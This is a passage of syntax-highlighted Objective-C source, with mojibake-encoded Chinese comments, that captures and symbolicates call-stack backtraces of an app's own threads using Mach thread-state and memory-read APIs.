    <span class="hljs-keyword">return</span> [self bs_backtraceOfNSThread:[NSThread mainThread]];
}

<span class="hljs-comment">// è·å–æ‰€æœ‰çº¿ç¨‹çš„è°ƒç”¨æ ˆå›æº¯ä¿¡æ¯</span>
+ (NSString *)bs_backtraceOfAllThread {
    <span class="hljs-comment">// ç”¨äºå­˜å‚¨çº¿ç¨‹åˆ—è¡¨çš„æ•°ç»„</span>
    <span class="hljs-type">thread_act_array_t</span> threads;
    <span class="hljs-comment">// çº¿ç¨‹æ•°é‡</span>
    <span class="hljs-type">mach_msg_type_number_t</span> thread_count = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// è·å–å½“å‰ä»»åŠ¡ï¼ˆè¿›ç¨‹ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">task_t</span> this_task = mach_task_self();
    
    <span class="hljs-comment">// è·å–å½“å‰ä»»åŠ¡çš„æ‰€æœ‰çº¿ç¨‹åˆ—è¡¨</span>
    <span class="hljs-type">kern_return_t</span> kr = task_threads(this_task, &amp;threads, &amp;thread_count);
    <span class="hljs-comment">// å¦‚æœè·å–å¤±è´¥ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯</span>
    <span class="hljs-keyword">if</span>(kr != KERN_SUCCESS) {
        <span class="hljs-keyword">return</span> @<span class="hljs-string">"Fail to get information of all threads"</span>;
    }
    
    <span class="hljs-comment">// åˆ›å»ºå¯å˜å­—ç¬¦ä¸²ï¼Œç”¨äºæ‹¼æ¥æ‰€æœ‰çº¿ç¨‹çš„å›æº¯ä¿¡æ¯</span>
    NSMutableString *resultString = [NSMutableString stringWithFormat:@<span class="hljs-string">"Call Backtrace of %u threads:\n"</span>, thread_count];
    <span class="hljs-comment">// éå†æ‰€æœ‰çº¿ç¨‹</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; thread_count; i++) {
        <span class="hljs-comment">// è·å–æ¯ä¸ªçº¿ç¨‹çš„å›æº¯ä¿¡æ¯å¹¶è¿½åŠ åˆ°ç»“æœå­—ç¬¦ä¸²</span>
        [resultString appendString:_bs_backtraceOfThread(threads[i])];
    }
    <span class="hljs-comment">// è¿”å›ä¸å¯å˜å‰¯æœ¬</span>
    <span class="hljs-keyword">return</span> [resultString copy];
}

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark Get call backtrace of a mach_thread</span>
<span class="hljs-comment">// è·å–æŒ‡å®šMachçº¿ç¨‹çš„è°ƒç”¨æ ˆå›æº¯ï¼ˆæ ¸å¿ƒå‡½æ•°ï¼‰</span>
NSString *_bs_backtraceOfThread(<span class="hljs-type">thread_t</span> thread) {
    <span class="hljs-comment">// åˆ›å»ºç¼“å†²åŒºï¼Œæœ€å¤šå­˜å‚¨50å±‚å‡½æ•°è°ƒç”¨æ ˆ</span>
    <span class="hljs-type">uintptr_t</span> backtraceBuffer[<span class="hljs-number">50</span>];
    <span class="hljs-comment">// å½“å‰æ ˆå¸§ç´¢å¼•</span>
    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// åˆ›å»ºå¯å˜å­—ç¬¦ä¸²ç”¨äºå­˜å‚¨å›æº¯ä¿¡æ¯</span>
    NSMutableString *resultString = [[NSMutableString alloc] initWithFormat:@<span class="hljs-string">"Backtrace of Thread %u:\n"</span>, thread];
    
    <span class="hljs-comment">// æœºå™¨ä¸Šä¸‹æ–‡ç»“æ„ä½“ï¼Œç”¨äºå­˜å‚¨çº¿ç¨‹çš„å¯„å­˜å™¨çŠ¶æ€</span>
    _STRUCT_MCONTEXT machineContext;
    <span class="hljs-comment">// è·å–çº¿ç¨‹çš„æœºå™¨ä¸Šä¸‹æ–‡ï¼ˆå¯„å­˜å™¨çŠ¶æ€ï¼‰</span>
    <span class="hljs-keyword">if</span>(!bs_fillThreadStateIntoMachineContext(thread, &amp;machineContext)) {
        <span class="hljs-comment">// å¦‚æœè·å–å¤±è´¥ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯</span>
        <span class="hljs-keyword">return</span> [NSString stringWithFormat:@<span class="hljs-string">"Fail to get information about thread: %u"</span>, thread];
    }
    
    <span class="hljs-comment">// è·å–å½“å‰æŒ‡ä»¤åœ°å€ï¼ˆPCå¯„å­˜å™¨çš„å€¼ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> instructionAddress = bs_mach_instructionAddress(&amp;machineContext);
    <span class="hljs-comment">// å°†æŒ‡ä»¤åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå›æº¯åœ°å€</span>
    backtraceBuffer[i] = instructionAddress;
    <span class="hljs-comment">// ç´¢å¼•é€’å¢</span>
    ++i;
    
    <span class="hljs-comment">// è·å–é“¾æ¥å¯„å­˜å™¨çš„å€¼ï¼ˆARMæ¶æ„ç‰¹æœ‰ï¼Œä¿å­˜å‡½æ•°è¿”å›åœ°å€ï¼‰</span>
    <span class="hljs-type">uintptr_t</span> linkRegister = bs_mach_linkRegister(&amp;machineContext);
    <span class="hljs-comment">// å¦‚æœé“¾æ¥å¯„å­˜å™¨æœ‰å€¼ï¼ˆéx86æ¶æ„ï¼‰</span>
    <span class="hljs-keyword">if</span> (linkRegister) {
        <span class="hljs-comment">// å°†é“¾æ¥å¯„å­˜å™¨çš„å€¼ä½œä¸ºç¬¬äºŒä¸ªå›æº¯åœ°å€</span>
        backtraceBuffer[i] = linkRegister;
        <span class="hljs-comment">// ç´¢å¼•é€’å¢</span>
        i++;
    }
    
    <span class="hljs-comment">// å¦‚æœæŒ‡ä»¤åœ°å€ä¸º0ï¼Œè¯´æ˜è·å–å¤±è´¥</span>
    <span class="hljs-keyword">if</span>(instructionAddress == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> @<span class="hljs-string">"Fail to get instruction address"</span>;
    }
    
    <span class="hljs-comment">// åˆå§‹åŒ–æ ˆå¸§ç»“æ„ä½“</span>
    BSStackFrameEntry frame = {<span class="hljs-number">0</span>};
    <span class="hljs-comment">// è·å–å¸§æŒ‡é’ˆï¼ˆFPå¯„å­˜å™¨çš„å€¼ï¼ŒæŒ‡å‘å½“å‰æ ˆå¸§ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> framePtr = bs_mach_framePointer(&amp;machineContext);
    <span class="hljs-comment">// å¦‚æœå¸§æŒ‡é’ˆä¸º0ï¼Œæˆ–è€…æ— æ³•ä»è¯¥åœ°å€è¯»å–æ ˆå¸§æ•°æ®</span>
    <span class="hljs-keyword">if</span>(framePtr == <span class="hljs-number">0</span> ||
       bs_mach_copyMem((<span class="hljs-type">void</span> *)framePtr, &amp;frame, <span class="hljs-keyword">sizeof</span>(frame)) != KERN_SUCCESS) {
        <span class="hljs-comment">// è¿”å›é”™è¯¯ä¿¡æ¯</span>
        <span class="hljs-keyword">return</span> @<span class="hljs-string">"Fail to get frame pointer"</span>;
    }
    
    <span class="hljs-comment">// éå†æ ˆå¸§é“¾è¡¨ï¼Œæœ€å¤š50å±‚</span>
    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">50</span>; i++) {
        <span class="hljs-comment">// ä¿å­˜å½“å‰æ ˆå¸§çš„è¿”å›åœ°å€</span>
        backtraceBuffer[i] = frame.return_address;
        <span class="hljs-comment">// å¦‚æœè¿”å›åœ°å€ä¸º0ï¼Œæˆ–è€…å‰ä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆä¸º0ï¼Œæˆ–è€…æ— æ³•è¯»å–å‰ä¸€ä¸ªæ ˆå¸§</span>
        <span class="hljs-keyword">if</span>(backtraceBuffer[i] == <span class="hljs-number">0</span> ||
           frame.previous == <span class="hljs-number">0</span> ||
           bs_mach_copyMem(frame.previous, &amp;frame, <span class="hljs-keyword">sizeof</span>(frame)) != KERN_SUCCESS) {
            <span class="hljs-comment">// è·³å‡ºå¾ªç¯ï¼Œæ ˆå¸§éå†ç»“æŸ</span>
            <span class="hljs-keyword">break</span>;
        }
    }
    
    <span class="hljs-comment">// è®°å½•å®é™…è·å–çš„å›æº¯å±‚æ•°</span>
    <span class="hljs-type">int</span> backtraceLength = i;
    <span class="hljs-comment">// åˆ›å»ºç¬¦å·ä¿¡æ¯æ•°ç»„ï¼Œç”¨äºå­˜å‚¨æ¯ä¸ªåœ°å€å¯¹åº”çš„ç¬¦å·ä¿¡æ¯</span>
    Dl_info symbolicated[backtraceLength];
    <span class="hljs-comment">// å¯¹å›æº¯åœ°å€è¿›è¡Œç¬¦å·åŒ–ï¼ˆå°†åœ°å€è½¬æ¢ä¸ºå‡½æ•°åã€æ¨¡å—åç­‰ï¼‰</span>
    bs_symbolicate(backtraceBuffer, symbolicated, backtraceLength, <span class="hljs-number">0</span>);
    <span class="hljs-comment">// éå†æ‰€æœ‰å›æº¯åœ°å€</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; backtraceLength; ++i) {
        <span class="hljs-comment">// æ ¼å¼åŒ–æ¯ä¸€æ¡å›æº¯ä¿¡æ¯å¹¶è¿½åŠ åˆ°ç»“æœå­—ç¬¦ä¸²</span>
        [resultString appendFormat:@<span class="hljs-string">"%@"</span>, bs_logBacktraceEntry(i, backtraceBuffer[i], &amp;symbolicated[i])];
    }
    <span class="hljs-comment">// è¿½åŠ æ¢è¡Œç¬¦</span>
    [resultString appendFormat:@<span class="hljs-string">"\n"</span>];
    <span class="hljs-comment">// è¿”å›ä¸å¯å˜å‰¯æœ¬</span>
    <span class="hljs-keyword">return</span> [resultString copy];
}

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark Convert NSThread to Mach thread</span>
<span class="hljs-comment">// å°†NSThreadå¯¹è±¡è½¬æ¢ä¸ºMachçº¿ç¨‹ID</span>
<span class="hljs-comment">// è¿™ä¸ªå‡½æ•°é€šè¿‡ä¸´æ—¶ä¿®æ”¹çº¿ç¨‹åç§°æ¥åŒ¹é…NSThreadå’ŒMachçº¿ç¨‹</span>
<span class="hljs-type">thread_t</span> <span class="hljs-title function_">bs_machThreadFromNSThread</span><span class="hljs-params">(NSThread *nsthread)</span> {
    <span class="hljs-comment">// ç”¨äºå­˜å‚¨çº¿ç¨‹åç§°çš„ç¼“å†²åŒº</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">256</span>];
    <span class="hljs-comment">// çº¿ç¨‹æ•°é‡</span>
    <span class="hljs-type">mach_msg_type_number_t</span> count;
    <span class="hljs-comment">// çº¿ç¨‹åˆ—è¡¨æ•°ç»„</span>
    <span class="hljs-type">thread_act_array_t</span> <span class="hljs-built_in">list</span>;
    <span class="hljs-comment">// è·å–å½“å‰ä»»åŠ¡çš„æ‰€æœ‰çº¿ç¨‹</span>
    task_threads(mach_task_self(), &amp;<span class="hljs-built_in">list</span>, &amp;count);
    
    <span class="hljs-comment">// è·å–å½“å‰æ—¶é—´æˆ³ï¼Œç”¨ä½œä¸´æ—¶çº¿ç¨‹åç§°ï¼ˆç¡®ä¿å”¯ä¸€æ€§ï¼‰</span>
    NSTimeInterval currentTimestamp = [[NSDate date] timeIntervalSince1970];
    <span class="hljs-comment">// ä¿å­˜åŸå§‹çº¿ç¨‹åç§°</span>
    NSString *originName = [nsthread name];
    <span class="hljs-comment">// å°†çº¿ç¨‹åç§°ä¸´æ—¶è®¾ç½®ä¸ºæ—¶é—´æˆ³å­—ç¬¦ä¸²</span>
    [nsthread setName:[NSString stringWithFormat:@<span class="hljs-string">"%f"</span>, currentTimestamp]];
    
    <span class="hljs-comment">// å¦‚æœæ˜¯ä¸»çº¿ç¨‹ï¼Œç›´æ¥è¿”å›ä¿å­˜çš„ä¸»çº¿ç¨‹ID</span>
    <span class="hljs-keyword">if</span> ([nsthread isMainThread]) {
        <span class="hljs-keyword">return</span> (<span class="hljs-type">thread_t</span>)main_thread_id;
    }
    
    <span class="hljs-comment">// éå†æ‰€æœ‰Machçº¿ç¨‹</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; ++i) {
        <span class="hljs-comment">// å°†Machçº¿ç¨‹è½¬æ¢ä¸ºPOSIXçº¿ç¨‹ï¼ˆpthreadï¼‰</span>
        <span class="hljs-type">pthread_t</span> pt = pthread_from_mach_thread_np(<span class="hljs-built_in">list</span>[i]);
        <span class="hljs-comment">// å†æ¬¡æ£€æŸ¥æ˜¯å¦ä¸ºä¸»çº¿ç¨‹ï¼ˆå†—ä½™æ£€æŸ¥ï¼Œå®é™…ä¸Šè¿™ä¸ªæ¡ä»¶æ°¸è¿œä¸ä¼šæ»¡è¶³ï¼‰</span>
        <span class="hljs-keyword">if</span> ([nsthread isMainThread]) {
            <span class="hljs-comment">// å¦‚æœMachçº¿ç¨‹IDåŒ¹é…ä¸»çº¿ç¨‹ID</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>[i] == main_thread_id) {
                <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>[i];
            }
        }
        <span class="hljs-comment">// å¦‚æœpthreadè½¬æ¢æˆåŠŸ</span>
        <span class="hljs-keyword">if</span> (pt) {
            <span class="hljs-comment">// æ¸…ç©ºåç§°ç¼“å†²åŒº</span>
            name[<span class="hljs-number">0</span>] = <span class="hljs-string">'\0'</span>;
            <span class="hljs-comment">// è·å–pthreadçš„çº¿ç¨‹åç§°</span>
            pthread_getname_np(pt, name, <span class="hljs-keyword">sizeof</span> name);
            <span class="hljs-comment">// æ¯”è¾ƒçº¿ç¨‹åç§°æ˜¯å¦åŒ¹é…ï¼ˆå³æ˜¯å¦ä¸ºæˆ‘ä»¬ä¸´æ—¶è®¾ç½®çš„æ—¶é—´æˆ³ï¼‰</span>
            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, [nsthread name].UTF8String)) {
                <span class="hljs-comment">// æ¢å¤åŸå§‹çº¿ç¨‹åç§°</span>
                [nsthread setName:originName];
                <span class="hljs-comment">// è¿”å›åŒ¹é…çš„Machçº¿ç¨‹ID</span>
                <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>[i];
            }
        }
    }
    
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„çº¿ç¨‹ï¼Œæ¢å¤åŸå§‹åç§°</span>
    [nsthread setName:originName];
    <span class="hljs-comment">// è¿”å›å½“å‰çº¿ç¨‹IDï¼ˆä½œä¸ºåå¤‡æ–¹æ¡ˆï¼‰</span>
    <span class="hljs-keyword">return</span> mach_thread_self();
}

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark GenerateBacbsrackEnrty</span>
<span class="hljs-comment">// ç”Ÿæˆå•æ¡å›æº¯æ—¥å¿—æ¡ç›®</span>
<span class="hljs-comment">// å‚æ•°ï¼šæ¡ç›®åºå·ã€åœ°å€ã€ç¬¦å·ä¿¡æ¯</span>
NSString* <span class="hljs-title function_">bs_logBacktraceEntry</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> entryNum,
                               <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> address,
                               <span class="hljs-type">const</span> Dl_info* <span class="hljs-type">const</span> dlInfo)</span> {
    <span class="hljs-comment">// æ–‡ä»¶åœ°å€ç¼“å†²åŒºï¼ˆå½“æ–‡ä»¶åä¸ºç©ºæ—¶ç”¨äºå­˜å‚¨åœ°å€ï¼‰</span>
    <span class="hljs-type">char</span> faddrBuff[<span class="hljs-number">20</span>];
    <span class="hljs-comment">// ç¬¦å·åœ°å€ç¼“å†²åŒºï¼ˆå½“ç¬¦å·åä¸ºç©ºæ—¶ç”¨äºå­˜å‚¨åœ°å€ï¼‰</span>
    <span class="hljs-type">char</span> saddrBuff[<span class="hljs-number">20</span>];
    
    <span class="hljs-comment">// ä»å®Œæ•´è·¯å¾„ä¸­æå–æ–‡ä»¶åï¼ˆåªä¿ç•™æœ€åä¸€æ®µï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* fname = bs_lastPathEntry(dlInfo-&gt;dli_fname);
    <span class="hljs-comment">// å¦‚æœæ–‡ä»¶åä¸ºç©ºï¼ˆæœªæ‰¾åˆ°ç¬¦å·ä¿¡æ¯ï¼‰</span>
    <span class="hljs-keyword">if</span>(fname == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-comment">// å°†æ–‡ä»¶åŸºåœ°å€æ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸²</span>
        <span class="hljs-built_in">sprintf</span>(faddrBuff, POINTER_FMT, (<span class="hljs-type">uintptr_t</span>)dlInfo-&gt;dli_fbase);
        <span class="hljs-comment">// ä½¿ç”¨åœ°å€ä½œä¸ºæ–‡ä»¶å</span>
        fname = faddrBuff;
    }
    
    <span class="hljs-comment">// è®¡ç®—åœ°å€ç›¸å¯¹äºç¬¦å·åœ°å€çš„åç§»é‡</span>
    <span class="hljs-type">uintptr_t</span> offset = address - (<span class="hljs-type">uintptr_t</span>)dlInfo-&gt;dli_saddr;
    <span class="hljs-comment">// è·å–ç¬¦å·åç§°ï¼ˆå‡½æ•°åï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* sname = dlInfo-&gt;dli_sname;
    <span class="hljs-comment">// å¦‚æœç¬¦å·åç§°ä¸ºç©º</span>
    <span class="hljs-keyword">if</span>(sname == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-comment">// å°†æ–‡ä»¶åŸºåœ°å€æ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸²</span>
        <span class="hljs-built_in">sprintf</span>(saddrBuff, POINTER_SHORT_FMT, (<span class="hljs-type">uintptr_t</span>)dlInfo-&gt;dli_fbase);
        <span class="hljs-comment">// ä½¿ç”¨åœ°å€ä½œä¸ºç¬¦å·å</span>
        sname = saddrBuff;
        <span class="hljs-comment">// é‡æ–°è®¡ç®—åç§»é‡ï¼ˆç›¸å¯¹äºæ–‡ä»¶åŸºåœ°å€ï¼‰</span>
        offset = address - (<span class="hljs-type">uintptr_t</span>)dlInfo-&gt;dli_fbase;
    }
    <span class="hljs-comment">// æ ¼å¼åŒ–è¾“å‡ºï¼šæ¨¡å—å(30ä½å¯¹é½) åœ°å€ ç¬¦å·å + åç§»é‡</span>
    <span class="hljs-keyword">return</span> [NSString stringWithFormat:@<span class="hljs-string">"%-30s  0x%08"</span> PRIxPTR <span class="hljs-string">" %s + %lu\n"</span> ,fname, (<span class="hljs-type">uintptr_t</span>)address, sname, offset];
}

<span class="hljs-comment">// ä»å®Œæ•´è·¯å¾„ä¸­æå–æœ€åä¸€éƒ¨åˆ†ï¼ˆæ–‡ä»¶åï¼‰</span>
<span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title function_">bs_lastPathEntry</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-type">const</span> path)</span> {
    <span class="hljs-comment">// å¦‚æœè·¯å¾„ä¸ºç©ºï¼Œè¿”å›NULL</span>
    <span class="hljs-keyword">if</span>(path == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    
    <span class="hljs-comment">// æŸ¥æ‰¾æœ€åä¸€ä¸ª'/'å­—ç¬¦çš„ä½ç½®</span>
    <span class="hljs-type">char</span>* lastFile = <span class="hljs-built_in">strrchr</span>(path, <span class="hljs-string">'/'</span>);
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°'/'ï¼Œè¯´æ˜pathæœ¬èº«å°±æ˜¯æ–‡ä»¶åï¼›å¦åˆ™è¿”å›'/'åé¢çš„éƒ¨åˆ†</span>
    <span class="hljs-keyword">return</span> lastFile == <span class="hljs-literal">NULL</span> ? path : lastFile + <span class="hljs-number">1</span>;
}

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark HandleMachineContext</span>
<span class="hljs-comment">// æœºå™¨ä¸Šä¸‹æ–‡å¤„ç†ç›¸å…³å‡½æ•°</span>

<span class="hljs-comment">// è·å–çº¿ç¨‹çŠ¶æ€å¹¶å¡«å……åˆ°æœºå™¨ä¸Šä¸‹æ–‡ç»“æ„ä½“ä¸­</span>
<span class="hljs-type">bool</span> <span class="hljs-title function_">bs_fillThreadStateIntoMachineContext</span><span class="hljs-params">(<span class="hljs-type">thread_t</span> thread, _STRUCT_MCONTEXT *machineContext)</span> {
    <span class="hljs-comment">// çŠ¶æ€ç»“æ„ä½“çš„å¤§å°ï¼ˆä¸åŒæ¶æ„å¤§å°ä¸åŒï¼‰</span>
    <span class="hljs-type">mach_msg_type_number_t</span> state_count = BS_THREAD_STATE_COUNT;
    <span class="hljs-comment">// è°ƒç”¨å†…æ ¸å‡½æ•°è·å–çº¿ç¨‹çŠ¶æ€ï¼ˆå¯„å­˜å™¨å¿«ç…§ï¼‰</span>
    <span class="hljs-type">kern_return_t</span> kr = thread_get_state(thread, BS_THREAD_STATE, (<span class="hljs-type">thread_state_t</span>)&amp;machineContext-&gt;__ss, &amp;state_count);
    <span class="hljs-comment">// è¿”å›æ˜¯å¦æˆåŠŸè·å–</span>
    <span class="hljs-keyword">return</span> (kr == KERN_SUCCESS);
}

<span class="hljs-comment">// ä»æœºå™¨ä¸Šä¸‹æ–‡ä¸­æå–å¸§æŒ‡é’ˆå¯„å­˜å™¨çš„å€¼</span>
<span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">bs_mach_framePointer</span><span class="hljs-params">(<span class="hljs-type">mcontext_t</span> <span class="hljs-type">const</span> machineContext)</span>{
    <span class="hljs-comment">// é€šè¿‡å®å®šä¹‰è®¿é—®å¯¹åº”æ¶æ„çš„å¸§æŒ‡é’ˆå¯„å­˜å™¨</span>
    <span class="hljs-keyword">return</span> machineContext-&gt;__ss.BS_FRAME_POINTER;
}

<span class="hljs-comment">// ä»æœºå™¨ä¸Šä¸‹æ–‡ä¸­æå–æ ˆæŒ‡é’ˆå¯„å­˜å™¨çš„å€¼</span>
<span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">bs_mach_stackPointer</span><span class="hljs-params">(<span class="hljs-type">mcontext_t</span> <span class="hljs-type">const</span> machineContext)</span>{
    <span class="hljs-comment">// é€šè¿‡å®å®šä¹‰è®¿é—®å¯¹åº”æ¶æ„çš„æ ˆæŒ‡é’ˆå¯„å­˜å™¨</span>
    <span class="hljs-keyword">return</span> machineContext-&gt;__ss.BS_STACK_POINTER;
}

<span class="hljs-comment">// ä»æœºå™¨ä¸Šä¸‹æ–‡ä¸­æå–æŒ‡ä»¤æŒ‡é’ˆ/ç¨‹åºè®¡æ•°å™¨çš„å€¼</span>
<span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">bs_mach_instructionAddress</span><span class="hljs-params">(<span class="hljs-type">mcontext_t</span> <span class="hljs-type">const</span> machineContext)</span>{
    <span class="hljs-comment">// é€šè¿‡å®å®šä¹‰è®¿é—®å¯¹åº”æ¶æ„çš„æŒ‡ä»¤åœ°å€å¯„å­˜å™¨</span>
    <span class="hljs-keyword">return</span> machineContext-&gt;__ss.BS_INSTRUCTION_ADDRESS;
}

<span class="hljs-comment">// ä»æœºå™¨ä¸Šä¸‹æ–‡ä¸­æå–é“¾æ¥å¯„å­˜å™¨çš„å€¼ï¼ˆä»…ARMæ¶æ„æœ‰æ•ˆï¼‰</span>
<span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">bs_mach_linkRegister</span><span class="hljs-params">(<span class="hljs-type">mcontext_t</span> <span class="hljs-type">const</span> machineContext)</span>{
<span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__i386__) || defined(__x86_64__)</span>
    <span class="hljs-comment">// x86æ¶æ„æ²¡æœ‰é“¾æ¥å¯„å­˜å™¨ï¼Œè¿”å›0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
<span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
    <span class="hljs-comment">// ARMæ¶æ„è¿”å›LRå¯„å­˜å™¨çš„å€¼</span>
    <span class="hljs-keyword">return</span> machineContext-&gt;__ss.__lr;
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}

<span class="hljs-comment">// ä»æŒ‡å®šå†…å­˜åœ°å€å¤åˆ¶æ•°æ®åˆ°ç›®æ ‡åœ°å€</span>
<span class="hljs-comment">// ä½¿ç”¨vm_read_overwriteç¡®ä¿å¯ä»¥å®‰å…¨è¯»å–å…¶ä»–çº¿ç¨‹çš„å†…å­˜</span>
<span class="hljs-type">kern_return_t</span> <span class="hljs-title function_">bs_mach_copyMem</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *<span class="hljs-type">const</span> src, <span class="hljs-type">void</span> *<span class="hljs-type">const</span> dst, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> numBytes)</span>{
    <span class="hljs-comment">// å®é™…å¤åˆ¶çš„å­—èŠ‚æ•°</span>
    <span class="hljs-type">vm_size_t</span> bytesCopied = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// ä½¿ç”¨è™šæ‹Ÿå†…å­˜è¯»å–è¦†å†™å‡½æ•°ï¼Œå¯ä»¥è·¨çº¿ç¨‹è¯»å–å†…å­˜</span>
    <span class="hljs-keyword">return</span> vm_read_overwrite(mach_task_self(), (<span class="hljs-type">vm_address_t</span>)src, (<span class="hljs-type">vm_size_t</span>)numBytes, (<span class="hljs-type">vm_address_t</span>)dst, &amp;bytesCopied);
}

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark Symbolicate</span>
<span class="hljs-comment">// ç¬¦å·åŒ–ç›¸å…³å‡½æ•°ï¼šå°†å†…å­˜åœ°å€è½¬æ¢ä¸ºå¯è¯»çš„ç¬¦å·ä¿¡æ¯</span>

<span class="hljs-comment">// å¯¹å›æº¯åœ°å€æ•°ç»„è¿›è¡Œç¬¦å·åŒ–å¤„ç†</span>
<span class="hljs-comment">// å‚æ•°ï¼šå›æº¯åœ°å€ç¼“å†²åŒºã€ç¬¦å·ä¿¡æ¯ç¼“å†²åŒºã€æ¡ç›®æ•°é‡ã€è·³è¿‡çš„æ¡ç›®æ•°</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">bs_symbolicate</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span>* <span class="hljs-type">const</span> backtraceBuffer,
                    Dl_info* <span class="hljs-type">const</span> symbolsBuffer,
                    <span class="hljs-type">const</span> <span class="hljs-type">int</span> numEntries,
                    <span class="hljs-type">const</span> <span class="hljs-type">int</span> skippedEntries)</span>{
    <span class="hljs-comment">// å½“å‰å¤„ç†çš„ç´¢å¼•</span>
    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰è·³è¿‡æ¡ç›®ï¼Œä¸”ç´¢å¼•åœ¨æœ‰æ•ˆèŒƒå›´å†…</span>
    <span class="hljs-keyword">if</span>(!skippedEntries &amp;&amp; i &lt; numEntries) {
        <span class="hljs-comment">// ç¬¬ä¸€ä¸ªæ¡ç›®ï¼ˆå½“å‰æŒ‡ä»¤åœ°å€ï¼‰ç›´æ¥ç¬¦å·åŒ–ï¼Œä¸éœ€è¦è°ƒæ•´</span>
        bs_dladdr(backtraceBuffer[i], &amp;symbolsBuffer[i]);
        <span class="hljs-comment">// ç´¢å¼•é€’å¢</span>
        i++;
    }
    
    <span class="hljs-comment">// å¤„ç†å‰©ä½™çš„è¿”å›åœ°å€</span>
    <span class="hljs-keyword">for</span>(; i &lt; numEntries; i++) {
        <span class="hljs-comment">// è¿”å›åœ°å€éœ€è¦å‡1æ‰èƒ½å¾—åˆ°è°ƒç”¨æŒ‡ä»¤çš„åœ°å€ï¼Œç„¶åè¿›è¡Œç¬¦å·åŒ–</span>
        <span class="hljs-comment">// å› ä¸ºè¿”å›åœ°å€æŒ‡å‘çš„æ˜¯è°ƒç”¨åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</span>
        bs_dladdr(CALL_INSTRUCTION_FROM_RETURN_ADDRESS(backtraceBuffer[i]), &amp;symbolsBuffer[i]);
    }
}

<span class="hljs-comment">// è‡ªå®šä¹‰å®ç°çš„dladdrå‡½æ•°ï¼Œç”¨äºå°†åœ°å€è½¬æ¢ä¸ºç¬¦å·ä¿¡æ¯</span>
<span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªæ‰‹åŠ¨è§£æMach-Oæ–‡ä»¶çš„ç¬¦å·è¡¨æ¥æŸ¥æ‰¾ç¬¦å·çš„è¿‡ç¨‹</span>
<span class="hljs-type">bool</span> <span class="hljs-title function_">bs_dladdr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> address, Dl_info* <span class="hljs-type">const</span> info)</span> {
    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¦å·ä¿¡æ¯ç»“æ„ä½“çš„æ‰€æœ‰å­—æ®µä¸ºNULL</span>
    info-&gt;dli_fname = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// æ–‡ä»¶å</span>
    info-&gt;dli_fbase = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// æ–‡ä»¶åŸºåœ°å€</span>
    info-&gt;dli_sname = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// ç¬¦å·å</span>
    info-&gt;dli_saddr = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// ç¬¦å·åœ°å€</span>
    
    <span class="hljs-comment">// æŸ¥æ‰¾åŒ…å«è¯¥åœ°å€çš„é•œåƒç´¢å¼•</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> idx = bs_imageIndexContainingAddress(address);
